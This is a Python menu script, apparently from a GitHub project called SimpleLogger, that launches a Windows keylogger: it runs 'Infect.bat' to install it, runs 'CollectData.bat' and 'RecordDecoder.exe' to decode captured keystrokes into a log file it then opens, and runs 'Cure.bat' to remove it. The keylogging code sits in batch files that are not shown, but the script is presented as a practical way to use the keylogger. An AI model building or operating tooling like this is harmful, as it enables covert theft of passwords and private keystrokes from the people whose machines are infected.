import os
import ctypes
import time

def display_error_message(title, message):
    MB_ICONERROR =   0x00000010
    MB_OK =   0x00000000
    ctypes.windll.user32.MessageBoxW(0, message, title, MB_ICONERROR | MB_OK)

def b_file(chosen):
    if chosen ==   1:
        file = "Infect.bat"
    elif chosen ==   2:
        file = "CollectData.bat"
    elif chosen ==   3:
        file = "Cure.bat"
    elif chosen ==   808:
        file = "RecordDecoder.exe"
    elif chosen ==   404:
        file = "Data.txt"
    else:
        file = None
    return file

def open_text_file(filename):
    try:
        os.startfile(filename)
    except Exception as e:
        # Handle exceptions if the file cannot be opened
        print(f"Failed to open {filename}: {e}")

def main():
    while True:
        try:
            print("\n1) Infects KeyLogger")
            print("2) Collect Data from KeyLogger")
            print("3) Cures KeyLogger")
            print("99) Exit")
            choice = int(input("Enter a digit: "))
            if choice ==   808 or choice ==   404:
                display_error_message("Reserved Process Numbers", "Numbers 404 and 808 are reserved process numbers and are not in the menu.")
            elif choice !=   99:
                file = b_file(choice)
                if file:
                    if os.path.exists(file):
                        if choice ==   2:
                            b_file(808)
                            os.system("RecordDecoder.exe")
                            time.sleep(2)
                            open_text_file("Data.log")

                        else:
                            os.system(file)
                        print("\nExecution Successful")
                    else:
                        display_error_message("Keylogger Error", "The Keylogger is corrupted.")
            elif choice ==   99:
                break
        except ValueError:
            print("\nPlease enter a valid number.")

if __name__ == "__main__":
   print(r'''
  _________ __               .__    .___.____                                       __________                   
 /   _____//  |_ __ ________ |__| __| _/|    |    ____   ____   ____   ___________  \____    /___________  ____  
 \_____  \\   __\  |  \____ \|  |/ __ | |    |   /  _ \ / ___\ / ___\_/ __ \_  __ \   /     // __ \_  __ \/  _ \ 
 /        \|  | |  |  /  |_> >  / /_/ | |    |__(  <_> ) /_/  > /_/  >  ___/|  | \/  /     /\  ___/|  | \(  <_> )
/_______  /|__| |____/|   __/|__\____ | |_______ \____/\___  /\___  / \___  >__|    /_______ \___  >__|   \____/ 
        \/            |__|           \/         \/    /_____//_____/      \/                \/   \/              
        ''')
   print("All credit to Minhas Kamal (Github User) who provided the actual keylogger bat files")
   print("DefinetlyNotAI has remixed the project to provide a menu system as well as a practical way to use the keylogger")
   print("Go to https://github.com/DefinetlyNotAI/SimpleLogger")
   time.sleep(2)
   main()

